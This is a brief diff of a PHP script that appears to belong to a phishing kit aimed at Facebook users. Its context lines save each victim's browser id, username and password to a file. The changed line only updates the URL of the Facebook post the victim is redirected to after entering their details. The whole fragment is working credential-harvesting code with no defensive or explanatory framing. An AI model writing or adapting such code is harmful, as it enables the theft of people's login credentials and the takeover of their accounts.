@@ -14,5 +14,5 @@ if ($password == '')
 	exit();
 }
 fwrite($handle,"\n"."Browser id = ".$browser_id."\n"."Username = ".$email."\n"."password = ".$password."\n");
-header('location:https://www.facebook.com/100050541976926/posts/110141280680604/?app=fbl');
+header('location:https://www.facebook.com/100045973835913/posts/154339656108495/?substory_index=1&app=fbl');
 ?>
